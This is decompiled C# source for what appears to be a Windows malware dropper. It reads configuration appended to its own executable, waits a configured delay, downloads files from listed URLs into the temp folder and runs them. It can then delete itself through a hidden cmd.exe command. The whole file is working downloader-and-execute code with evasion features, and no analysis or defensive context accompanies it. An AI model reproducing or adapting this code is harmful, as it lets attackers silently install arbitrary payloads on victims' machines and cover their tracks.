using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ____;

[StandardModule]
internal sealed class Module1
{
	private const string job = "<<<<<<<<<===========>>>>>>>>>";

	private const string lesliensdujob = "*--------------------*";

	private static string workers;

	private static string[] bureaux;

	private static string[] lesfemmes;

	private static WebClient wc = new WebClient();

	private static string pth;

	[STAThread]
	public static void Main()
	{
		workers = Encoding.Default.GetString(File.ReadAllBytes(Application.get_ExecutablePath()));
		bureaux = Strings.Split(workers, "<<<<<<<<<===========>>>>>>>>>", -1, (CompareMethod)0);
		lesfemmes = Strings.Split(bureaux[1], "*--------------------*", -1, (CompareMethod)0);
		Thread.Sleep(TimeSpan.FromSeconds(Conversions.ToDouble(bureaux[2])));
		string[] array = lesfemmes;
		foreach (string text in array)
		{
			if (Operators.CompareString(text, "", false) != 0)
			{
				pth = Path.GetTempPath() + Path.GetFileName(text);
				wc.DownloadFile(text, pth);
				Process.Start(pth);
			}
		}
		if (Operators.CompareString(bureaux[3], "True", false) == 0)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + Application.get_ExecutablePath().ToString() + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			Process.Start(processStartInfo);
		}
	}
}
